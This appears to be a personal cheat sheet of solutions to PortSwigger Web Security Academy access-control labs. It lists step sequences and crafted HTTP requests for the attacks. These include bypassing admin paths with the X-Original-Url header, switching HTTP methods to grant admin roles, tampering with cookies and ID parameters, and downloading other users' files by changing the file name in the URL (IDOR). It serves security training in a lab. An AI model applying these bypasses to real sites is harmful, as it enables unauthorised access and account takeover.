### Unprotected admin functionality
**Payload** : 
`https://url/robots.txt -> find admin panel -> delete carlos`

### Unprotected admin functionality with unpredictable URL
**Payload** : 
`Inspect Element -> check file index json -> find admin url -> delete carlos`

### User role controlled by request parameter
**Payload** :
`Login as wiener -> edit cookies admin to 'true' -> go to /admin -> delete carlos`

### User role can be modified in user profile
**Payload** :
```json
{
	"email":"email@gmail.com",
	"roleid":2
}
```
`Login as wiener -> on change email add key 'roleid' with value 2 -> go to /admin -> delete carlos`


### User ID controlled by request parameter
**Payload** : 
`change paramete 'id' on profile page to carlos -> submit API KEY carlos`

### User ID controlled by request parameter, with unpredictable user IDs
**Payload** : 
`find post with author carlos -> go to profile page -> change id with id carlos -> submit API KEY carlos`

### User ID controlled by request parameter with data leakage in redirect
**Payload** : 
`login as wiener -> change email -> intercept the request -> send to repeater -> send it -> follow redirection -> change the value /my-account?id=wiener to carlos -> send it -> copy the API KEY from the response`

### User ID controlled by request parameter with password disclosure
**Payload** : 
`The same as before, but the different is change the wiener to administrator -> then the password is gonna show up, then change the type in inspect element from 'password' to 'text'`

### URL-based access control can be circumvented
**Payload** :
```http
GET /?username=carlos HTTP/2
Host: 0a3b00de04d1db41847b3668002b00ec.web-security-academy.net
Cookie: session={cookies}
X-Original-Url: /admin/delete
```

Some framework support various non-standard HTTP header, such as `X-Original-URL` or `X-Rewrite-URL`, that can lead bypass rule path, such as this rule:
`DENY: POST, /admin/deleteUser, managers`

### Insecure direct object references
**Payload** :
`capture packet when trying to download transcript -> follow redirection -> edit filename to 1.txt -> login as carlos`
```http
GET /download-transcript/1.txt HTTP/2
```

### Method-based access control can be circumvented
**Payload** :
`intercept request change roles -> send to repeater -> change the method to GET -> move body request to parameter -> change the value cookies to cookies weiner`

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ad1006f04c39a6b80e749f5009d0057.web-security-academy.net
Cookie: session=BKBQEL8QWKJVy2al7I2Qq9df9q4SOrn8
```


### Multi-step process with no access control on one step
**Payload** :
`try to capture every process on changing roles -> on final packet that will send, change the cookie to wiener cookie`

```http
POST /admin-roles HTTP/2
Host: 0ac00028039e98d380164e5300b6009d.web-security-academy.net
Cookie: session={wienerCookie}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0ac00028039e98d380164e5300b6009d.web-security-academy.net
Dnt: 1
Referer: https://0ac00028039e98d380164e5300b6009d.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

action=upgrade&confirmed=true&username=wiener
```


### Referer-based access control
**Payload** :
`Same as before, what you need just change the cookie to wiener cookie. But while follow redirection change the path from '/admin' to '/'
It could happen because some websites base access controls on the `Referer` header submitted in the HTTP request. example, an application robustly enforces access control over the main administrative page at `/admin`, but for sub-pages such as `/admin/deleteUser` only inspects the `Referer` header.

